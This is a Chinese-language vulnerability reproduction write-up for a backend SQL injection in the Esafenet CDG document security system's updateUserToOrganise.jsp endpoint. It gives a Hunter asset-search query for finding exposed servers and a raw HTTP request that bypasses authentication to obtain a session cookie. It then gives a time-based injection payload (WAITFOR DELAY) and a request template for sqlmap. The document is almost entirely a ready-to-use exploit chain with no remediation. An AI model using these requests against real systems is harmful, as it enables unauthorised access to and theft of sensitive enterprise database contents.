# 亿赛通电子文档安全管理系统updateUserToOrganise存在后台SQL注入漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统updateUserToOrganise存在后台SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/qycXV3gmNouzwWlZ/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-291578.png)

# 四、漏洞复现
1. 通过身份认证绕过漏扫获取cookie

```java
POST /CDGServer3/LinkFilterService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
```

![1706457190372-a4617e08-6349-4765-8781-65369d7d4a99.png](./img/qycXV3gmNouzwWlZ/1706457190372-a4617e08-6349-4765-8781-65369d7d4a99-664924.png)

```java
JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
```

2. sql注入

```java
POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Content-Length: 33
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
Accept-Encoding: gzip

userId=1';WAITFOR DELAY '0:0:1'--
```

![1706457248013-9305c59d-b8d9-4f17-bcc6-b9a1707e8cce.png](./img/qycXV3gmNouzwWlZ/1706457248013-9305c59d-b8d9-4f17-bcc6-b9a1707e8cce-940116.png)

3. sqlmap

```java
POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Content-Length: 33
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
Accept-Encoding: gzip

userId=1
```

![1706457552134-bbb6ed1c-7502-4dfb-81fe-f08c238044a8.png](./img/qycXV3gmNouzwWlZ/1706457552134-bbb6ed1c-7502-4dfb-81fe-f08c238044a8-154865.png)



> 更新: 2024-04-20 22:01:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cfx26o5cmkgld0ga>